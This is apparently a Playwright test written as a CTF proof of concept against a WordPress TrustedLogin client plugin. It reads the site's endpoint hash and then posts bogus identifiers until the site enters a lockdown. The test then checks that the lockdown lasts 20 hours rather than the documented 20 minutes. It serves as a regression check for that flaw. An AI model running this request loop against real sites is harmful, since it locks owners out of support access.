/**
 * CTF: exploit chain — client-side lockdown DoS (P2-1 in client.md).
 * Fire 3 bogus identifiers with the real endpoint hash, verify a 4th
 * attempt gets the in-lockdown response and site is DoS'd for 20 HOURS
 * (LOCKDOWN_EXPIRY = 72000, not the documented 20 min).
 */
import { test, expect, BrowserContext, Page } from '@playwright/test';
import * as fs from 'fs';
import * as path from 'path';
import { wpCli, resetClientState } from './_helpers';

const VENDOR_STATE = JSON.parse(
    fs.readFileSync( path.join( __dirname, '..', 'fixtures', '.cache-vendor-state.json' ), 'utf-8' )
);

async function loginClientAdmin( ctx: BrowserContext ) {
    const p = await ctx.newPage();
    await p.goto( `${ VENDOR_STATE.client_url }/wp-login.php`, { waitUntil: 'domcontentloaded' } );
    if ( ! p.url().includes( 'wp-login.php' ) ) { await p.close(); return; }
    await p.locator( '#user_login' ).fill( 'admin' );
    await p.locator( '#user_pass' ).fill( 'admin' );
    await Promise.all( [
        p.waitForURL( /\/wp-admin\//, { timeout: 15_000 } ),
        p.locator( '#wp-submit' ).click(),
    ] );
    await p.close();
}

test( 'ctf: lockdown DoS via 3 bogus identifiers with valid endpoint', async ( { browser, request } ) => {
    resetClientState();

    // Drive a legit grant via the UI so the endpoint option is populated.
    const grantCtx = await browser.newContext();
    await loginClientAdmin( grantCtx );
    const vp = await grantCtx.newPage();
    await vp.goto( VENDOR_STATE.form_page_url, { waitUntil: 'domcontentloaded' } );
    await vp.locator( '.tl-grant-access' ).waitFor( { state: 'visible' } );
    await vp.locator( '.tl-grant-access .tl-site-url' ).fill( VENDOR_STATE.client_url );
    await vp.locator( '.tl-grant-access .tl-site-url' ).press( 'Tab' );
    const popupPromise = grantCtx.waitForEvent( 'page' );
    await vp.locator( '.tl-grant-access input[type="submit"]' ).click();
    const popup: Page = await popupPromise;
    try { await popup.waitForLoadState( 'domcontentloaded' ); } catch {}
    try { await popup.locator( '.button-trustedlogin-' + VENDOR_STATE.namespace ).first().click(); } catch {}
    await vp.waitForFunction( () => {
        const el = document.querySelector( '.tl-site-key' );
        return el && el.textContent && el.textContent.length > 10;
    }, null, { timeout: 30_000 } );
    await grantCtx.close();

    // Now pull the endpoint option from the client site.
    const endpoint = wpCli(
        'wp-cli-client',
        `echo get_option("tl_pro-block-builder_endpoint");`,
        'extract endpoint option',
    ).trim();
    console.log( 'Exfiltrated endpoint:', endpoint );
    expect( endpoint ).toMatch( /^[a-f0-9]{32}$/ );

    const post = async ( ident: string ) => {
        const resp = await request.post( VENDOR_STATE.client_url + '/', {
            maxRedirects: 0,
            form: { action: 'trustedlogin', endpoint, identifier: ident },
        } );
        return {
            status: resp.status(),
            location: resp.headers()[ 'location' ] || '(none)',
        };
    };

    const rand = () => wpCli( 'wp-cli-client', `echo bin2hex(random_bytes(64));`, 'rand ident' ).trim();

    for ( let i = 1; i <= 4; i++ ) {
        const r = await post( rand() );
        console.log( `attempt ${ i }: ${ r.status } → ${ r.location.slice( 0, 120 ) }` );
    }

    // Inspect lockdown transient via the TL Utils wrapper (not WP's get_transient — Utils
    // stores the value as a raw option with the transient NAME as the key).
    const peek = wpCli(
        'wp-cli-client',
        `$v = \\TrustedLogin\\Utils::get_transient("tl-${ VENDOR_STATE.namespace }-in_lockdown");`
        + `if ($v === false) { echo "NOT_SET"; } else {`
        + `  $opt = get_option("tl-${ VENDOR_STATE.namespace }-in_lockdown");`
        + `  $ttl = isset($opt["expiration"]) ? ($opt["expiration"] - time()) : -1;`
        + `  echo "LOCKED stored_at=" . $v . " ttl_remaining=" . $ttl . "s"; }`,
        'peek lockdown',
    );
    console.log( 'Lockdown transient:', peek );

    const countPeek = wpCli(
        'wp-cli-client',
        `$v = \\TrustedLogin\\Utils::get_transient("tl-${ VENDOR_STATE.namespace }-used_accesskeys");`
        + `if ($v === false) { echo "NOT_SET"; } else { echo "count=" . count( (array) $v ); }`,
        'peek used-accesskey counter',
    );
    console.log( 'Used-accesskey transient:', countPeek );

    expect( peek, 'lockdown MUST be active after 3 bogus attempts' ).toMatch( /^LOCKED/ );
    // After the constant fix, TTL should be ~1200s (20 min), not 72000s (20 h).
    const ttlMatch = peek.match( /ttl_remaining=(\d+)s/ );
    expect( ttlMatch, 'peek should include ttl_remaining' ).not.toBeNull();
    const ttl = Number( ttlMatch![ 1 ] );
    expect( ttl, 'TTL should be ≤ 1200s (20 min) not 72000s (20 h)' ).toBeLessThanOrEqual( 1200 );
    expect( ttl, 'TTL should be positive' ).toBeGreaterThan( 0 );
} );

